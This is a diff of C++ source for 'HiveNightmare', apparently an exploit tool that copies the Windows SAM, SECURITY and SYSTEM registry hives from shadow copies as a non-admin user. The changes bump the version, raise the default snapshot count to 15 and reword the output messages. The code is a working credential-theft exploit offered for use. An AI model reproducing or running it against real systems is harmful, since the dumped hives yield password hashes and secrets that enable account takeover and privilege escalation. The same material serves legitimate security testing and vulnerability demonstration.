@@ -6,6 +6,7 @@
 // 0.2 - 20/07/2021 - Adds support for 4 snapshots
 // 0.3 - 20/07/2021 - merge in support for SYSTEM and SECURITY dumping, various bug fixes
 // 0.4 - 21/07/2021 - better code shocker :O
+// 0.5 - 21/07/2021 - favour retrieving hives from latest snapshot, UTF-16 support, bump to 15 snapshots
 
 #include <windows.h>
 #include <io.h>
@@ -92,7 +93,7 @@ int main(int argc, char* argv[])
     _setmode(_fileno(stdout), _O_U16TEXT);
     if (argc > 1) {
         if (sscanf_s(argv[1], "%d", &searchDepth) != 1) {
-            wcout << "\nUsage: HiveNightmare.exe [max shadows to look at (default 4)]\n\n";
+            wcout << "\nUsage: HiveNightmare.exe [max shadows to look at (default 15)]\n\n";
             return -1;
         }
     }
@@ -100,7 +101,7 @@ int main(int argc, char* argv[])
         searchDepth = 15;
     }
 
-    wcout << L"\nHiveNightmare v0.4 - dump registry hives as non-admin users\n\nSpecify maximum number of shadows to inspect with parameter if wanted, default is 15.\n\nRunning...\n\n";
+    wcout << L"\nHiveNightmare v0.5 - dump registry hives as non-admin users\n\nSpecify maximum number of shadows to inspect with parameter if wanted, default is 15.\n\nRunning...\n\n";
 
     HANDLE hFile;
 
@@ -117,10 +118,10 @@ int main(int argc, char* argv[])
     }
     else {
         getFileTime(hFile, fileTime, 200);
-        swprintf_s(fileName, L"SAM-%s", fileTime);
+        swprintf_s(fileName, L"SAM-%s", fileTime); //buggy if name too long
         dumpHandleToFile(hFile, fileName);
         CloseHandle(hFile);
-        wcout << endl << L"Copy of SAM hive from " << fileTime << L" written out to current working directory as " << fileName << endl << endl;
+        wcout << endl << L"Success: SAM hive from " << fileTime << L" written out to current working directory as " << fileName << endl << endl;
     }
     
 
@@ -134,7 +135,7 @@ int main(int argc, char* argv[])
         swprintf_s(fileName, L"SECURITY-%s", fileTime);
         dumpHandleToFile(hFile, fileName);
         CloseHandle(hFile);
-        wcout << endl << L"SECURITY hive from " << fileTime << L" written out to current working directory as " << fileName << endl << endl;
+        wcout << endl << L"Success: SECURITY hive from " << fileTime << L" written out to current working directory as " << fileName << endl << endl;
     }
     
 
@@ -148,10 +149,10 @@ int main(int argc, char* argv[])
         swprintf_s(fileName, L"SYSTEM-%s", fileTime);
         dumpHandleToFile(hFile, fileName);
         CloseHandle(hFile);
-        wcout << endl << L"SYSTEM hive from " << fileTime << L" written out to current working directory as " << fileName << endl << endl;
+        wcout << endl << L"Success: SYSTEM hive from " << fileTime << L" written out to current working directory as " << fileName << endl << endl;
     }
 
-    wcout << endl << L"Assuming no errors, should be able to find hive dump files in current working directory." << endl;
+    wcout << endl << L"Assuming no errors above, you should be able to find hive dump files in current working directory." << endl;
 
     return 0;
 }
